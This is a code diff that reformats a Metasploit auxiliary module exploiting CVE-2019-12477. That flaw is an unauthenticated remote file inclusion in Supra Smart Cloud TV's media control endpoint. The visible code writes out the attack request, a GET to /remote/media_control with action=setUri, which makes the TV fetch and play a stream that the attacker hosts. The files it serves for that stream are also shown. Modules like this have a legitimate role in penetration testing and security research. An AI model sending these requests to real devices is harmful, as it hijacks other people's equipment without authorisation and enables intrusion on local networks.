@@ -8,26 +8,29 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Supra Smart Cloud TV Remote File Inclusion',
-      'Description'    => %q{
-        This module exploits an unauthenticated remote file inclusion which
-        exists in Supra Smart Cloud TV. The media control for the device doesn't
-        have any session management or authentication. Leveraging this, an
-        attacker on the local network can send a crafted request to broadcast a
-        fake video.
-      },
-      'Author'         => [
-        'Dhiraj Mishra', # Discovery, PoC, and module
-        'wvu'            # Module
-      ],
-      'References'     => [
-        ['CVE', '2019-12477'],
-        ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']
-      ],
-      'DisclosureDate' => '2019-06-03',
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Supra Smart Cloud TV Remote File Inclusion',
+        'Description' => %q{
+          This module exploits an unauthenticated remote file inclusion which
+          exists in Supra Smart Cloud TV. The media control for the device doesn't
+          have any session management or authentication. Leveraging this, an
+          attacker on the local network can send a crafted request to broadcast a
+          fake video.
+        },
+        'Author' => [
+          'Dhiraj Mishra', # Discovery, PoC, and module
+          'wvu'            # Module
+        ],
+        'References' => [
+          ['CVE', '2019-12477'],
+          ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']
+        ],
+        'DisclosureDate' => '2019-06-03',
+        'License' => MSF_LICENSE
+      )
+    )
 
     deregister_options('URIPATH')
   end
@@ -37,12 +40,12 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Broadcasting Epic Sax Guy to #{peer}")
     res = send_request_cgi(
-      'method'        => 'GET',
-      'uri'           => '/remote/media_control',
+      'method' => 'GET',
+      'uri' => '/remote/media_control',
       'encode_params' => false,
-      'vars_get'      => {
-        'action'      => 'setUri',
-        'uri'         => get_uri + 'epicsax.m3u8'
+      'vars_get' => {
+        'action' => 'setUri',
+        'uri' => get_uri + 'epicsax.m3u8'
       }
     )
 
@@ -62,11 +65,11 @@ class MetasploitModule < Msf::Auxiliary
 
     files = {
       '/epicsax.m3u8' => 'application/x-mpegURL',
-      '/epicsax0.ts'  => 'video/MP2T',
-      '/epicsax1.ts'  => 'video/MP2T',
-      '/epicsax2.ts'  => 'video/MP2T',
-      '/epicsax3.ts'  => 'video/MP2T',
-      '/epicsax4.ts'  => 'video/MP2T'
+      '/epicsax0.ts' => 'video/MP2T',
+      '/epicsax1.ts' => 'video/MP2T',
+      '/epicsax2.ts' => 'video/MP2T',
+      '/epicsax3.ts' => 'video/MP2T',
+      '/epicsax4.ts' => 'video/MP2T'
     }
 
     file = request.uri
